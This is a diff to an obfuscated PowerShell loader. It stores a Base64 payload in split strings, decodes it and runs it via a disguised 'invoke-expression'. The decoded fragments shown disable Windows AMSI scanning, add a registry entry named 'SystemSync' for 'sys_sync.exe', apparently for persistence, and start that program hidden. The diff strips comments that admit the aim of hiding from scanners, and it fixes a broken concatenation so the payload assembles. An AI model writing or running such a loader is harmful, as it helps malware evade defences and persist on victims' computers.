@@ -1,4 +1,3 @@
-# Break the logic into chunks to hide from scanners
 $a = 'W1JlZl0uQXNzZW1ibHkuR2V0VHlwZXMoKTsgZm9yZWFjaCggJGIgaW4gJGEgKSB7IGlmICggJGIuTmFtZSAt'
 $b = 'bGlrZSAiKmlVdGlscyIgKSAgeyAkYyA9ICRiOyBicmVhazsgfSB9IDsgJGQgPSAkYy5HZXRGaWVsZCggImFt'
 $c = 'c2lJbml0RmFpbGVkIiwgIk5vblB1YmxpYyxTdGF0aWMiICkgOyAkZC5TZXRWYWx1ZSggJG51bGwsICR0cnVl'
@@ -13,7 +12,6 @@ $k = 'IjsgJHcuQ3JlYXRlS2V5KDIxNDc0ODM2NTAsICRyKTsgJHcuU2V0U3RyaW5nVmFsdWUoMjE0Nz
 $l = 'JHIsICJTeXN0ZW1TeW5jIiwgIiRiXHN5c19zeW5jLmV4ZSIpOyBTdGFydC1Qcm9jZXNzICIkYlxzeXNfc3lu'
 $m = 'Yy5leGUiIC1XaW5kb3dTdHlsZSBIaWRkZW47'
 
-# Reconstruct and execute in-memory
-$final = $a+$b+Reference$d+$e+$f+$g+$h+$i+$j+$k+$l+$m
+$final = $a+$b+$c+$d+$e+$f+$g+$h+$i+$j+$k+$l+$m
 $exec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($final))
 & ( 'inv' + 'oke-expr' + 'ession' ) $exec
